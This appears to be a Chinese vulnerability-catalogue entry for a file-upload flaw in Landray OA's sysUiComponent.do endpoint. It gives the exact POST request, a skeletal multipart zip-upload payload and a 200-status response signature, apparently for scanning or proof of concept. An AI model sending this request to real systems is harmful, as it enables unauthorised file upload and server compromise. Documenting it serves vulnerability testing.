# 蓝凌OAsysUiComponent.doZip上传漏洞

蓝凌OAsysUiComponent.doZip上传 ｜ 文件上传 ｜ —
- **请求**：`POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1`

**Payload**
```
-----------------------------15610248407689
Content-Disposition: form-data; name="file"; filename="test.zip"
Content-Type: application/x-zip-compressed
PK
-----------------------------15610248407689--
```
- **响应特征**：200 status